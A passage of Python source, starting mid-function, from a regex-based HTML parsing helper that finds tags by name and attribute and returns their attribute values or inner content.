            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst

